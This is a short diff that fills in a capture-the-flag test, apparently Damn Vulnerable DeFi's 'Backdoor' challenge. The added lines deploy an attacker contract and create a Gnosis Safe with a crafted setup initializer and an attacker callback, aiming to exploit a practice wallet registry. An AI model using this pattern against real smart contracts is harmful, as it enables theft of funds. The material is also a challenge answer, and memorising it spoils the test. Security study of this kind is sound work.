@@ -46,6 +46,23 @@ describe('[Challenge] Backdoor', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const walletRegistryAttacker = await (await ethers.getContractFactory('WalletRegistryAttacker', player)).deploy(walletFactory.address, walletRegistry.address);
+
+        const initializer = (await ethers.getContractFactory('GnosisSafe', deployer)).interface.encodeFunctionData("setup", [
+          [alice.address],
+          1,
+          ethers.constants.AddressZero,
+          0,
+          ethers.constants.AddressZero,
+          ethers.constants.AddressZero,
+          0,
+          ethers.constants.AddressZero
+        ]);
+
+        const singleton = masterCopy.address;
+        const saltNonce = 1;
+        const callbackAddress = walletRegistryAttacker.address;
+        await walletRegistryAttacker.connect(player).createSafe(singleton, initializer, saltNonce, callbackAddress);
     });
 
     after(async function () {
